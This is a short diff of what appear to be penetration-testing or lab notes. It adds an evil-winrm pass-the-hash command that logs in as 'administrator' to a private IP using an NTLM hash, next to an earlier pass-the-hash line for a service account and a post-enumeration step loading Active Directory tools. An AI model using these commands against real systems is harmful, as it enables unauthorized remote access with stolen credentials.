@@ -6,6 +6,7 @@
 
 #pass the hash
 evil-winrm -i 192.168.120.91 -u svc_apache$ -H E9492A23D8FB9A8E6073EA446D861DCD
+evil-winrm -u administrator -H 8c802621d2e36fc074345dded890f3e5 -i 192.168.205.59
 
 #Post Enumeration
 *Evil-WinRM* PS C:\Users\enox\Desktop> Import-Module ActiveDirectory
